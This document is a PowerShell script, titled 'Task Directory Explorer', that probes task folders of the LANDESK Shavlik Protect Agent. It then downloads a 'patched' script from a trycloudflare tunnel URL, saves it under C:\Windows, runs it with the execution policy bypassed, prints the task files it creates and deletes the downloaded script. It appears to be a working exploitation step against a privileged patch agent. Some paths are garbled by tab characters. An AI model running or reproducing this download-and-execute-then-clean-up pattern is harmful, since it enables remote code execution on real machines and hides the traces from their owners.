param([string]$TunnelUrl = "https://taxes-surprised-immediately-transportation.trycloudflare.com")

Write-Host "=== Task Directory Explorer ==="

$dir1 = "C:\Windows\System32	asks\"
$dir2 = "C:\Program Files\LANDESK\Shavlik Protect Agent\"

# Pre-dispatch check
Write-Host "Pre-dispatch:"
Get-ChildItem "$dir1*.txt" -ErrorAction SilentlyContinue | ForEach-Object {
    Write-Host "  C:\Windows\System32	asks\$($_.Name) size=$($_.Length)"
}
if (Test-Path ($dir2 + "tasks\")) {
    Write-Host "  Agent	asks\ exists"
    Get-ChildItem ($dir2 + "tasks\*.txt") -ErrorAction SilentlyContinue | ForEach-Object {
        Write-Host "  $($_.FullName) size=$($_.Length)"
    }
} else {
    Write-Host "  Agent	asks\ does NOT exist"
}

# Upload run_patched_simple.ps1 and run available-tasks
$patcherUrl = "$TunnelUrl/scripts/run_patched_simple.ps1"
$patcherContent = (iwr -Uri $patcherUrl -UseBasicParsing).Content
Set-Content "C:\Windows\Tasksxplorer_patcher.ps1" $patcherContent -Encoding UTF8

# Run available-tasks to trigger task file creation  
Write-Host "`nRunning available-tasks (patched)..."
$result = powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Windows\Tasksxplorer_patcher.ps1" -Command "available-tasks" 2>&1 | Out-String
Write-Host $result

# Post-dispatch check
Start-Sleep -Seconds 2
Write-Host "`nPost-dispatch:"
Get-ChildItem "$dir1*.txt" -ErrorAction SilentlyContinue | ForEach-Object {
    Write-Host "  C:\Windows\System32	asks\$($_.Name) size=$($_.Length)"
    $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
    if ($content) { Write-Host "  Content: $content" }
}
Get-ChildItem ("$dir2" + "tasks\*.txt") -ErrorAction SilentlyContinue | ForEach-Object {
    Write-Host "  Agent	asks\$($_.Name) size=$($_.Length)"
    $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
    if ($content) { Write-Host "  Content: $content" }
}

# Cleanup
Remove-Item "C:\Windows\Tasksxplorer_patcher.ps1" -Force -ErrorAction SilentlyContinue
Write-Host "`n=== Done ==="
